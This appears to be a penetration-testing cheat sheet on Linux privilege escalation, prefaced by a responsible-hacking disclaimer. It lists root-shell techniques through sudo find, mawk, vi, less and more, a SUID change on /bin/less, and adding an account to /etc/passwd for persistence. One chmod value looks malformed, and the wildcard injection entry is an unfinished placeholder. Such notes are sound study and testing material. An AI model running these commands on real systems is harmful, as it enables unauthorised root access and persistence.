# Privilege Escalation

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
{% endhint %}

### Privilege Escalation

[https://payatu.com/guide-linux-privilege-escalation](https://payatu.com/guide-linux-privilege-escalation)

list user's sudo permissions: `sudo -l`

execute any command while in `less`: `!<cmd>`

Privilege Escalation to Root by setting suid on `/bin/less`: `chmod 47555 /bin/less`

Privilege Escalation to Root with `find`: `sudo find /etc -exec sh -i \;`

wildcard injection: \[NEED MORE HERE\]

```bash
mawk 'BEGIN {system("/bin/sh")}'
```

If your user can `sudo` any of these text editors:

```bash
1. [user@localhost]$ sudo vi
2. :shell
3. [root@localhost]#

1. [user@localhost]$ sudo less file.txt
2. !bash
3. [root@localhost]#

1. [user@localhost]$ sudo more long_file.txt
2. !bash
3. [root@localhost]#
Note: for this method to work, the attacker has to read a file that is longer than one page
```

### Add Account/Password to /etc/passwd

Generate password with `openssl passwd -1 -salt [Username] [PASSWD]` , then add to `/etc/passwd` file which is in the format: `Username:generated password:UID:GUID:root:/root:/bin/bash` \(assumes you have write privilege to this file!\). Can be used for persistence.



